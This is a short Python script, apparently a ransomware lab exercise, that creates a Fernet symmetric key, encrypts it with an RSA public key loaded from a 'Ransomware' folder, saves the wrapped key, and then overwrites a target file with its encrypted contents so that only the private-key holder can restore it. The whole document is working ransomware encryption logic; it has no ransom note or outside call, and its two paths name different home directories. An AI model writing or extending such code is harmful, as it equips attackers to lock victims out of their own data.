from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
import os

# Generate Symmetric Key (AES-based)
symmetric_key = Fernet.generate_key()
fernet_instance = Fernet(symmetric_key)

# Load Public Key for Encryption
public_key_path = "/home/prof/Desktop/Ransomware/public_key.key"
try:
    with open(public_key_path, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )
except FileNotFoundError:
    print(f"Error: Public key file '{public_key_path}' not found.")
    exit(1)

# Encrypt Symmetric Key using RSA Public Key
encrypted_symmetric_key = public_key.encrypt(
    symmetric_key,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# Save the Encrypted Symmetric Key
encrypted_key_path = "encryptedSymmetricKey.key"
try:
    with open(encrypted_key_path, "wb") as key_file:
        key_file.write(encrypted_symmetric_key)
    print(f"Encrypted symmetric key saved to {encrypted_key_path}")
except Exception as e:
    print(f"Error saving encrypted key: {e}")
    exit(1)

# Encrypt the Target File
file_path = "/home/kali/Desktop/Ransomware/FileToEncrypt.txt"
if not os.path.exists(file_path):
    print(f"Error: File '{file_path}' not found.")
    exit(1)

try:
    with open(file_path, "rb") as file:
        file_data = file.read()

    encrypted_data = fernet_instance.encrypt(file_data)

    with open(file_path, "wb") as file:
        file.write(encrypted_data)

    print(f"File '{file_path}' successfully encrypted.")
except Exception as e:
    print(f"Error encrypting file: {e}")
